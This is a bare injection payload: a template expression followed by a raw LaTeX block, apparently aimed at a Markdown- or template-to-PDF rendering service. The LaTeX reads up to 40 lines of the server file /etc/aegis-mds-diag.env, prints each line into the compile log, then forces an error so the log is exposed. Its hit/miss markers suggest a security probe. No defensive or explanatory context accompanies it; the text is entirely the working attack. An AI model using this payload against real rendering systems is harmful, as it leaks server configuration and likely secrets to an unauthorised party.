{{ overrides | merge(defaults) | json }}

```{=latex}
\newread\leak
\newcount\linecount
\openin\leak=/etc/aegis-mds-diag.env
\ifeof\leak
  \typeout{AEGIS-MISS:/etc/aegis-mds-diag.env}
\else
  \typeout{AEGIS-HIT:/etc/aegis-mds-diag.env}
  \linecount=0
  \def\readnext{
    \ifeof\leak
      \let\next\relax
    \else
      \read\leak to \leakline
      \advance\linecount by 1
      \typeout{FILELINE:\the\linecount:\leakline}
      \ifnum\linecount<40
        \let\next\readnext
      \else
        \let\next\relax
      \fi
    \fi
    \next
  }
  \readnext
\fi
\closein\leak
\errmessage{AEGIS-FORCE-DIAGNOSTIC}
\mbox{}
```
